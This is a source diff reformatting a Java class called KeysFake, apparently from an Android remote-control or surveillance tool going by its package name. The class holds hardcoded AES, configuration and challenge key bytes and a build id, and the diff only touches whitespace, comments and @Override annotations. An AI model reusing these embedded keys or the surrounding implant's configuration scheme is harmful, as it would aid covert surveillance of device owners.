@@ -21,13 +21,13 @@ public class KeysFake extends Keys {
 			(byte) 0x47, (byte) 0x55, (byte) 0x17, (byte) 0x77, (byte) 0x72,
 			(byte) 0xaf, (byte) 0x6b, (byte) 0xfd, (byte) 0x6f, (byte) 0xc9,
 			(byte) 0xd5, (byte) 0x6f, (byte) 0xfd };
-	
+
 	/** The Conf key. */
 	byte[] ConfKey = new byte[] { (byte) 0xa9, (byte) 0x98, (byte) 0x76,
 			(byte) 0x7f, (byte) 0x8c, (byte) 0x31, (byte) 0x99, (byte) 0xb0,
 			(byte) 0x33, (byte) 0x8c, (byte) 0xb2, (byte) 0xd9, (byte) 0x98,
 			(byte) 0x08, (byte) 0x42, (byte) 0x58 };
-	
+
 	/** The Challenge key. */
 	byte[] ChallengeKey = new byte[] { (byte) 0x57, (byte) 0x2e, (byte) 0xbc,
 			(byte) 0x94, (byte) 0x39, (byte) 0x12, (byte) 0x81, (byte) 0xcc,
@@ -37,24 +37,33 @@ public class KeysFake extends Keys {
 	/** The Build id. */
 	String BuildId = "RCS_0000000179";
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.crypto.Keys#getAesKey()
 	 */
+	@Override
 	public byte[] getAesKey() {
 		;
 		return AesKey;
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.crypto.Keys#getChallengeKey()
 	 */
+	@Override
 	public byte[] getChallengeKey() {
 		return ChallengeKey;
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.crypto.Keys#getConfKey()
 	 */
+	@Override
 	public byte[] getConfKey() {
 		return ConfKey;
 	}
@@ -63,9 +72,12 @@ public class KeysFake extends Keys {
 	 * public byte[] getInstanceId() { return g_InstanceId; }
 	 */
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.crypto.Keys#getBuildId()
 	 */
+	@Override
 	public byte[] getBuildId() {
 		return BuildId.getBytes();
 	}
